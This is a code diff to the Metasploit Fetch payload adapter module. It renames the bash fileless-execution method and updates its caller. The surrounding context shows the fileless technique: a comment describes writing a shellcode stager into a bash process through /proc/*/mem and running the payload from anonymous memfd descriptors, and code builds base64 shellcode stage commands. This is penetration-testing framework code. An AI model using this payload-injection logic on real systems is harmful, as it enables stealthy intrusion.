@@ -209,7 +209,7 @@ module Msf::Payload::Adapter::Fetch
   end
 
   def _execute_nix(get_file_cmd)
-    return _generate_fileless(get_file_cmd) if datastore['FETCH_FILELESS'] == 'bash'
+    return _generate_fileless_bash(get_file_cmd) if datastore['FETCH_FILELESS'] == 'bash'
     return _generate_fileless_python(get_file_cmd) if datastore['FETCH_FILELESS'] == 'python3.8+'
 
 
@@ -373,7 +373,7 @@ module Msf::Payload::Adapter::Fetch
 
   # Original Idea: The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
   # New idea: use /proc/*/mem to write shellcode stager into bash process and create anonymous handle on-fly, then search for that handle and use same approach as original idea
-  def _generate_fileless(get_file_cmd)
+  def _generate_fileless_bash(get_file_cmd)
     stage_cmd = %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
     stage_cmd << %(jmp=#{_generate_jmp_instruction};)
     stage_cmd << "sc=$(base64 -d <<< #{_generate_first_stage_shellcode});"
